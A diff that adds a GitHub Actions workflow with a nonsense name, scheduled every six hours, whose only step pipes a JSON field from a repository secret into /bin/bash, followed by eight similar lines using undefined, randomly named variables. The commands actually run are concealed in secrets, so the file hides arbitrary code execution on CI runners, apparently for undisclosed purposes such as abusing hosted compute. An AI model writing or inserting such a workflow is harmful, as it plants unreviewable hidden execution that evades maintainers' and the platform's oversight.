@@ -1,0 +1,24 @@
+name: overcookedmiserable
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: overcookedmiserable
+        env:
+          bfdz8: ${{ secrets.bfdz8 }}
+        run: |
+          echo $bfdz8 | jq -r .ubeu4 | /bin/bash
+          echo $av6342 | jq -r .ecluq6 | /bin/bash
+          echo $qbpox3486 | jq -r .fvvt9 | /bin/bash
+          echo $gn2 | jq -r .ir22 | /bin/bash
+          echo $h92183 | jq -r .qgevh185 | /bin/bash
+          echo $o5 | jq -r .snj4347 | /bin/bash
+          echo $p9198 | jq -r .lyzpg339 | /bin/bash
+          echo $aug7210 | jq -r .wffbp8 | /bin/bash
+          echo $gvkm8 | jq -r .v905 | /bin/bash
+
